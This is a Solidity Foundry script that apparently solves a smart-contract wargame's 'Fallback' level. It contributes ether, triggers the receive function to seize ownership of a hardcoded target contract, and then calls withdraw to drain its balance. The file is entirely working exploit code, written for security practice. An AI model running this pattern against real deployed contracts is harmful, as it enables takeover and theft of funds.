// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

import "../src/Counter.sol";

contract FallbackScript is Script, Test {
  address target = address(0x42aF6D338Dca9380619a7A51bAbE6045854FadA7);

  function run() public {
    vm.startBroadcast();
    console.log("msg.sender is %s", msg.sender);

    bytes memory payload = abi.encodeWithSignature("contribute()");
    (bool success, ) = target.call{value: 0.0001 ether}(payload);
    require(success, "Call to contribute() failed");

    (bool callSuccess, bytes memory result) = target.call{value: 0.0001 ether}("");
    require(callSuccess, "Call to receive() failed");
    emit log_named_bytes("Result received", result);

    (bool ownerSuccess, bytes memory ownerResult) = target.call(abi.encodeWithSignature("owner()"));
    require(ownerSuccess, "Call to ownwer() failed");
    address owner = abi.decode(ownerResult, (address));
    console.log("New owner is %s", owner);

    target.call(abi.encodeWithSignature("withdraw()"));

    vm.stopBroadcast();
  }
}
